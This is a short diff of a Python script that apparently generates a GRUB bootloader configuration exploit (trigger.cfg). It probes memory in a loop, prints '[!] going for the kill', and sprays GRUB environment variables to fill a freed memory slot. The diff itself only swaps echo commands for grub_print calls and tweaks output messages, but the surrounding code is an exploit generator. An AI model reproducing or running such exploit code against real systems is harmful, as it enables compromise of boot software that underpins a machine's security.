@@ -190,7 +190,7 @@ def clashgpt(basepath):
                 internal += command(f'set fun={fun:04}')
                 internal += probe.trigger(depth, fun)
                 internal += command('eval "set curr=\\$${end}"')
-                # internal += command('echo ${curr}')
+                # internal += grub_print('${curr}')
                 internal += command(
                     f'if [ "${{curr}}" = {teststr} ]; then set found=true ; break ; fi'
                 )
@@ -205,7 +205,7 @@ def clashgpt(basepath):
     internal = []
     internal += probe.unset_active()
     internal += control.set_active('${offset}')
-    internal += command('echo [!] Found: ${depth_} ${fun} ${curr}')
+    internal += grub_print('[!] Found: ${depth_} ${fun} ${curr}')
     internal += grub_print('[!] going for the kill')
     internal += command('unset ${end}')
     # spray grub_env_vars to get one in our free slot
@@ -221,7 +221,7 @@ def clashgpt(basepath):
     internal += ['break']
 
     trigger += while_loop('"${found}" != false', internal)
-    trigger += grub_print('done')
+    trigger += grub_print('[!] done')
 
     with open(f'{basepath}/trigger.cfg', 'w') as f:
         f.write('\n'.join(trigger))
